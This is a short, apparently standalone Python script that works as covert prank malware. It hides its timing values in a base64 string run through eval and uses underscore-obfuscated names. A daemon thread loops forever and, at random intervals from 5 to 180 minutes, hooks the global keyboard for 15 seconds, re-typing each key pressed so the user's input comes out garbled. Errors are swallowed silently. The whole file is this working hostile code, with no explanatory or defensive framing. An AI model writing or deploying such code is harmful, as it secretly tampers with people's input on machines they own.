import time as _t, random as _r, keyboard as _k, threading as _th

_iv = eval(__import__('base64').b64decode(b"WzUsMzAsNDAsNTAsNjAsMTIwLDE4MF0=").decode())

def _wait():
    _t.sleep(_r.choice(_iv)*60)

def _echo_typing():
    def _echo(e):
        if e.event_type=='down':
            try:
                _k.write(e.name, delay=0.1)
                _t.sleep(0.15)
                _k.write(e.name)
            except: pass
    try:
        _k.hook(_echo)
        _t.sleep(15)
        _k.unhook_all()
    except: pass

def _main():
    while True:
        _wait()
        _echo_typing()

if __name__=="__main__":
    _th.Thread(target=_main, daemon=True).start()
    while True: _t.sleep(99999)
